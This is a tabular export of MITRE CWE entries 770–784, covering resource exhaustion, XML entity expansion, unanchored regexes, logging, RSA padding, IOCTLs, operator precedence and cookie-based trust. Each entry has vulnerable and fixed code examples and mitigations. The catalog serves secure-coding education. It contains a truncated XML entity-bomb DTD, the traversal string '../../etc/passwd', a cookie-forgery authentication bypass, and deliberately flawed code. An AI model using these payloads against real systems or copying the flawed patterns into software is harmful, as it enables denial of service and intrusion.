CWE-770: Allocation of Resources Without Limits or Throttling,"The product allocates a reusable resource or group of resources on behalf of an actor without imposing any restrictions on the size or number of resources that can be allocated, in violation of the intended security policy for that actor.","Scope: Availability, Impact: Technical Impact:DoS: Resource Consumption (CPU); DoS: Resource Consumption (Memory); DoS: Resource Consumption (Other)When allocating resources without limits, an attacker could prevent other systems, applications, or processes from accessing the same type of resource., Likelihood: ","Example 1This code allocates a socket and forks each time it receives a new connection.(bad code)Example Language:Csock=socket(AF_INET, SOCK_STREAM, 0);while (1) {newsock=accept(sock, ...);printf(""A connection has been accepted\n"");pid = fork();}The program does not track how many connections have been made, and it does not limit the number of connections. Because forking is a relatively expensive operation, an attacker would be able to cause the system to run out of CPU, processes, or memory by making a large number of connections. Alternatively, an attacker could consume all available connections, preventing others from accessing the system remotely.Example 2In the following example a server socket connection is used to accept a request to store data on the local file system using a specified filename. The method openSocketConnection establishes a server socket to accept requests from a client. When a client establishes a connection to this service the getNextMessage method is first used to retrieve from the socket the name of the file to store the data, the openFileToWrite method will validate the filename and open a file to write to on the local file system. The getNextMessage is then used within a while loop to continuously read data from the socket and output the data to the file until there is no longer any data from the socket.(bad code)Example Language:Cint writeDataFromSocketToFile(char *host, int port){char filename[FILENAME_SIZE];char buffer[BUFFER_SIZE];int socket = openSocketConnection(host, port);if (socket < 0) {printf(""Unable to open socket connection"");return(FAIL);}if (getNextMessage(socket, filename, FILENAME_SIZE) > 0) {if (openFileToWrite(filename) > 0) {while (getNextMessage(socket, buffer, BUFFER_SIZE) > 0){if (!(writeToFile(buffer) > 0))break;}}closeFile();}closeSocket(socket);}This example creates a situation where data can be dumped to a file on the local file system without any limits on the size of the file. This could potentially exhaust file or disk resources and/or limit other clients' ability to access the service.Example 3In the following example, the processMessage method receives a two dimensional character array containing the message to be processed. The two-dimensional character array contains the length of the message in the first character array and the message body in the second character array. The getMessageLength method retrieves the integer value of the length from the first character array. After validating that the message length is greater than zero, the body character array pointer points to the start of the second character array of the two-dimensional character array and memory is allocated for the new body character array.(bad code)Example Language:C/* process message accepts a two-dimensional character array of the form [length][body] containing the message to be processed */int processMessage(char **message){char *body;int length = getMessageLength(message[0]);if (length > 0) {body = &message[1][0];processMessageBody(body);return(SUCCESS);}else {printf(""Unable to process message; invalid message length"");return(FAIL);}}This example creates a situation where the length of the body character array can be very large and will consume excessive memory, exhausting system resources. This can be avoided by restricting the length of the second character array with a maximum length checkAlso, consider changing the type from 'int' to 'unsigned int', so that you are always guaranteed that the number is positive. This might not be possible if the protocol specifically requires allowing negative values, or if you cannot control the return value from getMessageLength(), but it could simplify the check to ensure the input is positive, and eliminate other errors such as signed-to-unsigned conversion errors (CWE-195) that may occur elsewhere in the code.(good code)Example Language:Cunsigned int length = getMessageLength(message[0]);if ((length > 0) && (length < MAX_LENGTH)) {...}Example 4In the following example, a server object creates a server socket and accepts client connections to the socket. For every client connection to the socket a separate thread object is generated using the ClientSocketThread class that handles request made by the client through the socket.(bad code)Example Language:Javapublic void acceptConnections() {try {ServerSocket serverSocket = new ServerSocket(SERVER_PORT);int counter = 0;boolean hasConnections = true;while (hasConnections) {Socket client = serverSocket.accept();Thread t = new Thread(new ClientSocketThread(client));t.setName(client.getInetAddress().getHostName() + "":"" + counter++);t.start();}serverSocket.close();} catch (IOException ex) {...}}In this example there is no limit to the number of client connections and client threads that are created. Allowing an unlimited number of client connections and threads could potentially overwhelm the system and system resources.The server should limit the number of client connections and the client threads that are created. This can be easily done by creating a thread pool object that limits the number of threads that are generated.(good code)Example Language:Javapublic static final int SERVER_PORT = 4444;public static final int MAX_CONNECTIONS = 10;...public void acceptConnections() {try {ServerSocket serverSocket = new ServerSocket(SERVER_PORT);int counter = 0;boolean hasConnections = true;while (hasConnections) {hasConnections = checkForMoreConnections();Socket client = serverSocket.accept();Thread t = new Thread(new ClientSocketThread(client));t.setName(client.getInetAddress().getHostName() + "":"" + counter++);ExecutorService pool = Executors.newFixedThreadPool(MAX_CONNECTIONS);pool.execute(t);}serverSocket.close();} catch (IOException ex) {...}}Example 5An unnamed web site allowed a user to purchase tickets for an event. A menu option allowed the user to purchase up to 10 tickets, but the back end did not restrict the actual number of tickets that could be purchased.Example 5 References:[REF-667] Rafal Los. ""Real-Life Example of a 'Business Logic Defect' (Screen Shots!)"". 2011. 
				<http://h30501.www3.hp.com/t5/Following-the-White-Rabbit-A/Real-Life-Example-of-a-Business-Logic-Defect-Screen-Shots/ba-p/22581>.Example 6Here the problem is that every time a connection is made, more memory is allocated. So if one just opened up more and more connections, eventually the machine would run out of memory.(bad code)Example Language:Cbar connection() {foo = malloc(1024);return foo;}endConnection(bar foo) {free(foo);}int main() {while(1) {foo=connection();}endConnection(foo)}","Phase:  RequirementsClearly specify the minimum and maximum expectations for capabilities, and dictate which behaviors are acceptable when resource allocation reaches limits.Phase:  Architecture and DesignLimit the amount of resources that are accessible to unprivileged users. Set per-user limits for resources. Allow the system administrator to define these limits. Be careful to avoidCWE-410.Phase:  Architecture and DesignDesign throttling mechanisms into the system architecture. The best protection is to limit the amount of resources that an unauthorized user can cause to be expended. A strong authentication and access control model will help prevent such attacks from occurring in the first place, and it will help the administrator to identify who is committing the abuse. The login application should be protected against DoS attacks as much as possible. Limiting the database access, perhaps by caching result sets, can help minimize the resources expended. To further limit the potential for a DoS attack, consider tracking the rate of requests received from users and blocking requests that exceed a defined rate threshold.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Note:This will only be applicable to cases where user input can influence the size or frequency of resource allocations.Phase:  Architecture and DesignFor any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoidCWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.Phase:  Architecture and DesignMitigation of resource exhaustion attacks requires that the target system either:recognizes the attack and denies that user further access for a given amount of time, typically by using increasing time delaysuniformly throttles all requests in order to make it more difficult to consume resources more quickly than they can again be freed.The first of these solutions is an issue in itself though, since it may allow attackers to prevent the use of the system by a particular valid user. If the attacker impersonates the valid user, they may be able to prevent the user from accessing the server in question.The second solution can be difficult to effectively institute -- and even when properly done, it does not provide a full solution. It simply requires more resources on the part of the attacker.Phase:  Architecture and DesignEnsure that protocols have specific limits of scale placed on them.Phases:  Architecture and Design; ImplementationIf the program must fail, ensure that it fails gracefully (fails closed). There may be a temptation to simply let the program fail poorly in cases such as low memory conditions, but an attacker may be able to assert control before the software has fully exited. Alternately, an uncontrolled failure could cause cascading problems with other downstream components; for example, the program could send a signal to a downstream process so the process immediately knows that a problem has occurred and has a better chance of recovery.Ensure that all failures in resource allocation place the system into a safe posture.Phases:  Operation; Architecture and DesignStrategy:  Resource LimitationUse resource-limiting settings provided by the operating system or environment. For example, when managing system resources in POSIX, setrlimit() can be used to set limits for certain types of resources, and getrlimit() can determine how many resources are available. However, these functions are not available on all operating systems.When the current levels get close to the maximum that is defined for the application (seeCWE-770), then limit the allocation of further resources to privileged users; alternately, begin releasing resources for less-privileged users. While this mitigation may protect the system from attack, it will not necessarily stop attackers from adversely impacting other users.Ensure that the application performs the appropriate error checks and error handling in case resources become unavailable (CWE-703)."
CWE-771: Missing Reference to Active Allocated Resource,"The product does not properly maintain a reference to a resource that has been allocated, which prevents the resource from being reclaimed.","Scope: Availability, Impact: Technical Impact:DoS: Resource Consumption (Other)An attacker that can influence the allocation of resources that are not properly maintained could deplete the available resource pool and prevent all other processes from accessing the same type of resource., Likelihood: ",无示范例子,"Phases:  Operation; Architecture and DesignStrategy:  Resource LimitationUse resource-limiting settings provided by the operating system or environment. For example, when managing system resources in POSIX, setrlimit() can be used to set limits for certain types of resources, and getrlimit() can determine how many resources are available. However, these functions are not available on all operating systems.When the current levels get close to the maximum that is defined for the application (seeCWE-770), then limit the allocation of further resources to privileged users; alternately, begin releasing resources for less-privileged users. While this mitigation may protect the system from attack, it will not necessarily stop attackers from adversely impacting other users.Ensure that the application performs the appropriate error checks and error handling in case resources become unavailable (CWE-703)."
CWE-772: Missing Release of Resource after Effective Lifetime,"The product does not release a resource after its effective lifetime has ended, i.e., after the resource is no longer needed.","Scope: Availability, Impact: Technical Impact:DoS: Resource Consumption (Other)An attacker that can influence the allocation of resources that are not properly released could deplete the available resource pool and prevent all other processes from accessing the same type of resource., Likelihood: ","Example 1The following method never closes the new file handle. Given enough time, the Finalize() method for BufferReader should eventually call Close(), but there is no guarantee as to how long this action will take. In fact, there is no guarantee that Finalize() will ever be invoked. In a busy environment, the Operating System could use up all of the available file handles before the Close() function is called.(bad code)Example Language:Javaprivate void processFile(string fName){BufferReader fil = new BufferReader(new FileReader(fName));String line;while ((line = fil.ReadLine()) != null){processLine(line);}}The good code example simply adds an explicit call to the Close() function when the system is done using the file. Within a simple example such as this the problem is easy to see and fix. In a real system, the problem may be considerably more obscure.(good code)Example Language:Javaprivate void processFile(string fName){BufferReader fil = new BufferReader(new FileReader(fName));String line;while ((line = fil.ReadLine()) != null){processLine(line);}fil.Close();}Example 2The following code attempts to open a new connection to a database, process the results returned by the database, and close the allocated SqlConnection object.(bad code)Example Language:C#SqlConnection conn = new SqlConnection(connString);SqlCommand cmd = new SqlCommand(queryString);cmd.Connection = conn;conn.Open();SqlDataReader rdr = cmd.ExecuteReader();HarvestResults(rdr);conn.Connection.Close();The problem with the above code is that if an exception occurs while executing the SQL or processing the results, the SqlConnection object is not closed. If this happens often enough, the database will run out of available cursors and not be able to execute any more SQL queries.Example 3This code attempts to open a connection to a database and catches any exceptions that may occur.(bad code)Example Language:Javatry {Connection con = DriverManager.getConnection(some_connection_string);}catch ( Exception e ) {log( e );}If an exception occurs after establishing the database connection and before the same connection closes, the pool of database connections may become exhausted. If the number of available connections is exceeded, other users cannot access this resource, effectively denying access to the application.Example 4Under normal conditions the following C# code executes a database query, processes the results returned by the database, and closes the allocated SqlConnection object. But if an exception occurs while executing the SQL or processing the results, the SqlConnection object is not closed. If this happens often enough, the database will run out of available cursors and not be able to execute any more SQL queries.(bad code)Example Language:C#...SqlConnection conn = new SqlConnection(connString);SqlCommand cmd = new SqlCommand(queryString);cmd.Connection = conn;conn.Open();SqlDataReader rdr = cmd.ExecuteReader();HarvestResults(rdr);conn.Connection.Close();...Example 5The following C function does not close the file handle it opens if an error occurs. If the process is long-lived, the process can run out of file handles.(bad code)Example Language:Cint decodeFile(char* fName) {char buf[BUF_SZ];FILE* f = fopen(fName, ""r"");if (!f) {printf(""cannot open %s\n"", fName);return DECODE_FAIL;}else {while (fgets(buf, BUF_SZ, f)) {if (!checkChecksum(buf)) {return DECODE_FAIL;}else {decodeBlock(buf);}}}fclose(f);return DECODE_SUCCESS;}","Phase:  RequirementsStrategy:  Language SelectionUse a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.For example, languages such as Java, Ruby, and Lisp perform automatic garbage collection that releases memory for objects that have been deallocated.Phase:  ImplementationIt is good practice to be responsible for freeing all resources you allocate and to be consistent with how and where you free resources in a function. If you allocate resources that you intend to free upon completion of the function, you must be sure to free the resources at all exit points for that function including error conditions.Phases:  Operation; Architecture and DesignStrategy:  Resource LimitationUse resource-limiting settings provided by the operating system or environment. For example, when managing system resources in POSIX, setrlimit() can be used to set limits for certain types of resources, and getrlimit() can determine how many resources are available. However, these functions are not available on all operating systems.When the current levels get close to the maximum that is defined for the application (seeCWE-770), then limit the allocation of further resources to privileged users; alternately, begin releasing resources for less-privileged users. While this mitigation may protect the system from attack, it will not necessarily stop attackers from adversely impacting other users.Ensure that the application performs the appropriate error checks and error handling in case resources become unavailable (CWE-703)."
CWE-773: Missing Reference to Active File Descriptor or Handle,"The product does not properly maintain references to a file descriptor or handle, which prevents that file descriptor/handle from being reclaimed.","Scope: Availability, Impact: Technical Impact:DoS: Resource Consumption (Other)An attacker that can influence the allocation of resources that are not properly maintained could deplete the available resource pool and prevent all other processes from accessing the same type of resource., Likelihood: ",无示范例子,"Phases:  Operation; Architecture and DesignStrategy:  Resource LimitationUse resource-limiting settings provided by the operating system or environment. For example, when managing system resources in POSIX, setrlimit() can be used to set limits for certain types of resources, and getrlimit() can determine how many resources are available. However, these functions are not available on all operating systems.When the current levels get close to the maximum that is defined for the application (seeCWE-770), then limit the allocation of further resources to privileged users; alternately, begin releasing resources for less-privileged users. While this mitigation may protect the system from attack, it will not necessarily stop attackers from adversely impacting other users.Ensure that the application performs the appropriate error checks and error handling in case resources become unavailable (CWE-703)."
CWE-774: Allocation of File Descriptors or Handles Without Limits or Throttling,"The product allocates file descriptors or handles on behalf of an actor without imposing any restrictions on how many descriptors can be allocated, in violation of the intended security policy for that actor.","Scope: Availability, Impact: Technical Impact:DoS: Resource Consumption (Other)When allocating resources without limits, an attacker could prevent all other processes from accessing the same type of resource., Likelihood: ",无示范例子,"Phases:  Operation; Architecture and DesignStrategy:  Resource LimitationUse resource-limiting settings provided by the operating system or environment. For example, when managing system resources in POSIX, setrlimit() can be used to set limits for certain types of resources, and getrlimit() can determine how many resources are available. However, these functions are not available on all operating systems.When the current levels get close to the maximum that is defined for the application (seeCWE-770), then limit the allocation of further resources to privileged users; alternately, begin releasing resources for less-privileged users. While this mitigation may protect the system from attack, it will not necessarily stop attackers from adversely impacting other users.Ensure that the application performs the appropriate error checks and error handling in case resources become unavailable (CWE-703)."
CWE-775: Missing Release of File Descriptor or Handle after Effective Lifetime,"The product does not release a file descriptor or handle after its effective lifetime has ended, i.e., after the file descriptor/handle is no longer needed.","Scope: Availability, Impact: Technical Impact:DoS: Resource Consumption (Other)An attacker that can influence the allocation of resources that are not properly released could deplete the available resource pool and prevent all other processes from accessing the same type of resource., Likelihood: ",无示范例子,"Phases:  Operation; Architecture and DesignStrategy:  Resource LimitationUse resource-limiting settings provided by the operating system or environment. For example, when managing system resources in POSIX, setrlimit() can be used to set limits for certain types of resources, and getrlimit() can determine how many resources are available. However, these functions are not available on all operating systems.When the current levels get close to the maximum that is defined for the application (seeCWE-770), then limit the allocation of further resources to privileged users; alternately, begin releasing resources for less-privileged users. While this mitigation may protect the system from attack, it will not necessarily stop attackers from adversely impacting other users.Ensure that the application performs the appropriate error checks and error handling in case resources become unavailable (CWE-703)."
CWE-776: Improper Restriction of Recursive Entity References in DTDs ('XML Entity Expansion'),"The product uses XML documents and allows their structure to be defined with a Document Type Definition (DTD), but it does not properly control the number of recursive definitions of entities.","Scope: Availability, Impact: Technical Impact:DoS: Resource Consumption (Other)If parsed, recursive entity references allow the attacker to expand data exponentially, quickly consuming all system resources., Likelihood: ","Example 1The DTD and the very brief XML below illustrate what is meant by an XML bomb. The ZERO entity contains one character, the letter A. The choice of entity name ZERO is being used to indicate length equivalent to that exponent on two, that is, the length of ZERO is 2^0. Similarly, ONE refers to ZERO twice, therefore the XML parser will expand ONE to a length of 2, or 2^1. Ultimately, we reach entity THIRTYTWO, which will expand to 2^32 characters in length, or 4 GB, probably consuming far more data than expected.(attack code)Example Language:XML<?xml version=""1.0""?><!DOCTYPE MaliciousDTD [<!ENTITY ZERO ""A""><!ENTITY ONE ""&ZERO;&ZERO;""><!ENTITY TWO ""&ONE;&ONE;"">...<!ENTITY THIRTYTWO ""&THIRTYONE;&THIRTYONE;"">]><data>&THIRTYTWO;</data>","Phase:  OperationIf possible, prohibit the use of DTDs or use an XML parser that limits the expansion of recursive DTD entities.Phase:  ImplementationBefore parsing XML files with associated DTDs, scan for recursive entity declarations and do not continue parsing potentially explosive content."
CWE-777: Regular Expression without Anchors,"The product uses a regular expression to perform neutralization, but the regular expression is not anchored and may allow malicious or malformed data to slip through.","Scope: AvailabilityConfidentialityAccess Control, Impact: Technical Impact:Bypass Protection MechanismAn unanchored regular expression in the context of an allowlist will possibly result in a protection mechanism failure, allowing malicious or malformed data to enter trusted regions of the program. The specific consequences will depend on what functionality the allowlist was protecting., Likelihood: ","Example 1Consider a web application that supports multiple languages. It selects messages for an appropriate language by using the lang parameter.(bad code)Example Language:PHP$dir = ""/home/cwe/languages"";$lang = $_GET['lang'];if (preg_match(""/[A-Za-z0-9]+/"", $lang)) {include(""$dir/$lang"");}else {echo ""You shall not pass!\n"";}The previous code attempts to match only alphanumeric values so that language values such as ""english"" and ""french"" are valid while also protecting against path traversal,CWE-22. However, the regular expression anchors are omitted, so any text containing at least one alphanumeric character will now pass the validation step. For example, the attack string below will match the regular expression.(attack code)../../etc/passwdIf the attacker can inject code sequences into a file, such as the web server's HTTP request log, then the attacker may be able to redirect the lang parameter to the log file and execute arbitrary code.Example 2This code uses a regular expression to validate an IP string prior to using it in a call to the ""ping"" command.(bad code)Example Language:Pythonimport subprocessimport redef validate_ip_regex(ip: str):ip_validator = re.compile(r""((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}"")if ip_validator.match(ip):return ipelse:raise ValueError(""IP address does not match valid pattern."")def run_ping_regex(ip: str):validated = validate_ip_regex(ip)# The ping command treats zero-prepended IP addresses as octalresult = subprocess.call([""ping"", validated])print(result)Since the regular expression does not have anchors (CWE-777), i.e. is unbounded without ^ or $ characters, then prepending a 0 or 0x to the beginning of the IP address will still result in a matched regex pattern. Since the ping command supports octal and hex prepended IP addresses, it will use the unexpectedly valid IP address (CWE-1389). For example, ""0x63.63.63.63"" would be considered equivalent to ""99.63.63.63"". As a result, the attacker could potentially ping systems that the attacker cannot reach directly.","Phase:  ImplementationBe sure to understand both what will be matched and what will not be matched by a regular expression. Anchoring the ends of the expression will allow the programmer to define an allowlist strictly limited to what is matched by the text in the regular expression. If you are using a package that only matches one line by default, ensure that you can match multi-line inputs if necessary."
CWE-778: Insufficient Logging,"When a security-critical event occurs, the product either does not record the event or omits important details about the event when logging it.","Scope: Non-Repudiation, Impact: Technical Impact:Hide ActivitiesIf security critical information is not recorded, there will be no trail for forensic analysis and discovering the cause of problems or the source of attacks may become more difficult or impossible., Likelihood: ","Example 1The example below shows a configuration for the service security audit feature in the Windows Communication Foundation (WCF).(bad code)Example Language:XML<system.serviceModel><behaviors><serviceBehaviors><behavior name=""NewBehavior""><serviceSecurityAudit auditLogLocation=""Default""suppressAuditFailure=""false""serviceAuthorizationAuditLevel=""None""messageAuthenticationAuditLevel=""None"" />...</system.serviceModel>The previous configuration file has effectively disabled the recording of security-critical events, which would force the administrator to look to other sources during debug or recovery efforts.Logging failed authentication attempts can warn administrators of potential brute force attacks. Similarly, logging successful authentication events can provide a useful audit trail when a legitimate account is compromised. The following configuration shows appropriate settings, assuming that the site does not have excessive traffic, which could fill the logs if there are a large number of success or failure events (CWE-779).(good code)Example Language:XML<system.serviceModel><behaviors><serviceBehaviors><behavior name=""NewBehavior""><serviceSecurityAudit auditLogLocation=""Default""suppressAuditFailure=""false""serviceAuthorizationAuditLevel=""SuccessAndFailure""messageAuthenticationAuditLevel=""SuccessAndFailure"" />...</system.serviceModel>Example 2In the following Java example the code attempts to authenticate the user. If the login fails a retry is made. Proper restrictions on the number of login attempts are of course part of the retry functionality. Unfortunately, the failed login is not recorded and there would be no record of an adversary attempting to brute force the program.(bad code)Example Language:Javaif LoginUser(){// Login successfulRunProgram();} else {// Login unsuccessfulLoginRetry();}It is recommended to log the failed login action. Note that unneutralized usernames should not be part of the log message, and passwords should never be part of the log message.(good code)Example Language:Javaif LoginUser(){// Login successfullog.warn(""Login by user successful."");RunProgram();} else {// Login unsuccessfullog.warn(""Login attempt by user failed, trying again."");LoginRetry();}Example 3Consider this command for updating Azure's Storage Logging for Blob service, adapted from [REF-1307]:(bad code)Example Language:Shellaz storage logging update --account-name --account-key --services b --log d --retention 90The ""--log d"" portion of the command says to log deletes. However, the argument does not include the logging of writes and reads. Adding the ""rw"" arguments to the -log parameter will fix the issue:(good code)Example Language:Shellaz storage logging update --account-name --account-key --services b --log rwd --retention 90To enable Azure's storage analytic logs programmatically using PowerShell:(good code)Example Language:ShellSet-AzStorageServiceLoggingProperty -ServiceType Queue -LoggingOperations read,write,delete -RetentionDays 5 -Context $MyContextObjectNotice that here, the retention has been limited to 5 days.","Phase:  Architecture and DesignUse a centralized logging mechanism that supports multiple levels of detail.Phase:  ImplementationEnsure that all security-related successes and failures can be logged. When storing data in the cloud (e.g., AWS S3 buckets, Azure blobs, Google Cloud Storage, etc.), use the provider's controls to enable and capture detailed logging information.Phase:  OperationBe sure to set the level of logging appropriately in a production environment. Sufficient data should be logged to enable system administrators to detect attacks, diagnose errors, and recover from attacks. At the same time, logging too much data (CWE-779) can cause the same problems, including unexpected costs when using a cloud environment.Phase:  OperationTo enable storage logging using Azure's Portal, navigate to the name of the Storage Account, locate Monitoring (CLASSIC) section, and select Diagnostic settings (classic). For each of the various properties (blob, file, table, queue), ensure the status is properly set for the desired logging data. If using PowerShell, the Set-AzStorageServiceLoggingProperty command could be called using appropriate -ServiceType, -LoggingOperations, and -RetentionDays arguments."
CWE-779: Logging of Excessive Data,"The product logs too much information, making log files hard to process and possibly hindering recovery efforts or forensic analysis after an attack.","Scope: Availability, Impact: Technical Impact:DoS: Resource Consumption (CPU); DoS: Resource Consumption (Other)Log files can become so large that they consume excessive resources, such as disk and CPU, which can hinder the performance of the system., Likelihood: ; Scope: Non-Repudiation, Impact: Technical Impact:Hide ActivitiesLogging too much information can make the log files of less use to forensics analysts and developers when trying to diagnose a problem or recover from an attack., Likelihood: ; Scope: Non-Repudiation, Impact: Technical Impact:Hide ActivitiesIf system administrators are unable to effectively process log files, attempted attacks may go undetected, possibly leading to eventual system compromise., Likelihood: ",无示范例子,"Phase:  Architecture and DesignSuppress large numbers of duplicate log messages and replace them with periodic summaries. For example, syslog may include an entry that states ""last message repeated X times"" when recording repeated events.Phase:  Architecture and DesignSupport a maximum size for the log file that can be controlled by the administrator. If the maximum size is reached, the admin should be notified. Also, consider reducing functionality of the product. This may result in a denial-of-service to legitimate product users, but it will prevent the product from adversely impacting the entire system.Phase:  ImplementationAdjust configurations appropriately when the product is transitioned from a debug state to production."
CWE-780: Use of RSA Algorithm without OAEP,"The product uses the RSA algorithm but does not incorporate Optimal Asymmetric Encryption Padding (OAEP), which might weaken the encryption.","Scope: Access Control, Impact: Technical Impact:Bypass Protection MechanismWithout OAEP in RSA encryption, it will take less work for an attacker to decrypt the data or to infer patterns from the ciphertext., Likelihood: ","Example 1The example below attempts to build an RSA cipher.(bad code)Example Language:Javapublic Cipher getRSACipher() {Cipher rsa = null;try {rsa = javax.crypto.Cipher.getInstance(""RSA/NONE/NoPadding"");}catch (java.security.NoSuchAlgorithmException e) {log(""this should never happen"", e);}catch (javax.crypto.NoSuchPaddingException e) {log(""this should never happen"", e);}return rsa;}While the previous code successfully creates an RSA cipher, the cipher does not use padding. The following code creates an RSA cipher using OAEP.(good code)Example Language:Javapublic Cipher getRSACipher() {Cipher rsa = null;try {rsa = javax.crypto.Cipher.getInstance(""RSA/ECB/OAEPWithMD5AndMGF1Padding"");}catch (java.security.NoSuchAlgorithmException e) {log(""this should never happen"", e);}catch (javax.crypto.NoSuchPaddingException e) {log(""this should never happen"", e);}return rsa;}",无可能的缓解方案
CWE-781: Improper Address Validation in IOCTL with METHOD_NEITHER I/O Control Code,"The product defines an IOCTL that uses METHOD_NEITHER for I/O, but it does not validate or incorrectly validates the addresses that are provided.","Scope: IntegrityAvailabilityConfidentiality, Impact: Technical Impact:Modify Memory; Read Memory; Execute Unauthorized Code or Commands; DoS: Crash, Exit, or RestartAn attacker may be able to access memory that belongs to another process or user. If the attacker can control the contents that the IOCTL writes, it may lead to code execution at high privilege levels. At the least, a crash can occur., Likelihood: ",无示范例子,"Phase:  ImplementationIf METHOD_NEITHER is required for the IOCTL, then ensure that all user-space addresses are properly validated before they are first accessed. The ProbeForRead and ProbeForWrite routines are available for this task. Also properly protect and manage the user-supplied buffers, since the I/O Manager does not do this when METHOD_NEITHER is being used. See References.Phase:  Architecture and DesignIf possible, avoid using METHOD_NEITHER in the IOCTL and select methods that effectively control the buffer size, such as METHOD_BUFFERED, METHOD_IN_DIRECT, or METHOD_OUT_DIRECT.Phases:  Architecture and Design; ImplementationIf the IOCTL is part of a driver that is only intended to be accessed by trusted users, then use proper access control for the associated device or device namespace. See References."
CWE-782: Exposed IOCTL with Insufficient Access Control,"The product implements an IOCTL with functionality that should be restricted, but it does not properly enforce access control for the IOCTL.","Scope: IntegrityAvailabilityConfidentiality, Impact: Technical Impact:Varies by ContextAttackers can invoke any functionality that the IOCTL offers. Depending on the functionality, the consequences may include code execution, denial-of-service, and theft of data., Likelihood: ",无示范例子,"Phase:  Architecture and DesignIn Windows environments, use proper access control for the associated device or device namespace. See References."
CWE-783: Operator Precedence Logic Error,The product uses an expression in which operator precedence causes incorrect logic to be used.,"Scope: ConfidentialityIntegrityAvailability, Impact: Technical Impact:Varies by Context; Unexpected StateThe consequences will vary based on the context surrounding the incorrect precedence. In a security decision, integrity or confidentiality are the most likely results. Otherwise, a crash may occur due to the software reaching an unexpected state., Likelihood: ","Example 1In the following example, the method validateUser makes a call to another method to authenticate a username and password for a user and returns a success or failure code.(bad code)Example Language:C#define FAIL 0#define SUCCESS 1...int validateUser(char *username, char *password) {int isUser = FAIL;// call method to authenticate username and password// if authentication fails then return failure otherwise return successif (isUser = AuthenticateUser(username, password) == FAIL) {return isUser;}else {isUser = SUCCESS;}return isUser;}However, the method that authenticates the username and password is called within an if statement with incorrect operator precedence logic. Because the comparison operator ""=="" has a higher precedence than the assignment operator ""="", the comparison operator will be evaluated first and if the method returns FAIL then the comparison will be true, the return variable will be set to true and SUCCESS will be returned. This operator precedence logic error can be easily resolved by properly using parentheses within the expression of the if statement, as shown below.(good code)Example Language:C...if ((isUser = AuthenticateUser(username, password)) == FAIL) {...Example 2In this example, the method calculates the return on investment for an accounting/financial application. The return on investment is calculated by subtracting the initial investment costs from the current value and then dividing by the initial investment costs.(bad code)Example Language:Javapublic double calculateReturnOnInvestment(double currentValue, double initialInvestment) {double returnROI = 0.0;// calculate return on investmentreturnROI = currentValue - initialInvestment / initialInvestment;return returnROI;}However, the return on investment calculation will not produce correct results because of the incorrect operator precedence logic in the equation. The divide operator has a higher precedence than the minus operator, therefore the equation will divide the initial investment costs by the initial investment costs which will only subtract one from the current value. Again this operator precedence logic error can be resolved by the correct use of parentheses within the equation, as shown below.(good code)Example Language:Java...returnROI = (currentValue - initialInvestment) / initialInvestment;...Note that the initialInvestment variable in this example should be validated to ensure that it is greater than zero to avoid a potential divide by zero error (CWE-369).","Phase:  ImplementationRegularly wrap sub-expressions in parentheses, especially in security-critical code."
CWE-784: Reliance on Cookies without Validation and Integrity Checking in a Security Decision,"The product uses a protection mechanism that relies on the existence or values of a cookie, but it does not properly ensure that the cookie is valid for the associated user.","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism; Gain Privileges or Assume IdentityIt is dangerous to use cookies to set a user's privileges. The cookie can be manipulated to claim a high level of authorization, or to claim that successful authentication has occurred., Likelihood: ","Example 1The following code excerpt reads a value from a browser cookie to determine the role of the user.(bad code)Example Language:JavaCookie[] cookies = request.getCookies();for (int i =0; i< cookies.length; i++) {Cookie c = cookies[i];if (c.getName().equals(""role"")) {userRole = c.getValue();}}Example 2The following code could be for a medical records application. It performs authentication by checking if a cookie has been set.(bad code)Example Language:PHP$auth = $_COOKIES['authenticated'];if (! $auth) {if (AuthenticateUser($_POST['user'], $_POST['password']) == ""success"") {// save the cookie to send out in future responsessetcookie(""authenticated"", ""1"", time()+60*60*2);}else {ShowLoginScreen();die(""\n"");}}DisplayMedicalHistory($_POST['patient_ID']);The programmer expects that the AuthenticateUser() check will always be applied, and the ""authenticated"" cookie will only be set when authentication succeeds. The programmer even diligently specifies a 2-hour expiration for the cookie.However, the attacker can set the ""authenticated"" cookie to a non-zero value such as 1. As a result, the $auth variable is 1, and the AuthenticateUser() check is not even performed. The attacker has bypassed the authentication.Example 3In the following example, an authentication flag is read from a browser cookie, thus allowing for external control of user state data.(bad code)Example Language:JavaCookie[] cookies = request.getCookies();for (int i =0; i< cookies.length; i++) {Cookie c = cookies[i];if (c.getName().equals(""authenticated"") && Boolean.TRUE.equals(c.getValue())) {authenticated = true;}}","Phase:  Architecture and DesignAvoid using cookie data for a security-related decision.Phase:  ImplementationPerform thorough input validation (i.e.: server side validation) on the cookie data if you're going to use it for a security related decision.Phase:  Architecture and DesignAdd integrity checks to detect tampering.Phase:  Architecture and DesignProtect critical cookies from replay attacks, since cross-site scripting or other attacks may allow attackers to steal a strongly-encrypted cookie that also passes integrity checks. This mitigation applies to cookies that should only be valid during a single transaction or session. By enforcing timeouts, you may limit the scope of an attack. As part of your integrity check, use an unpredictable, server-side value that is not exposed to the client."
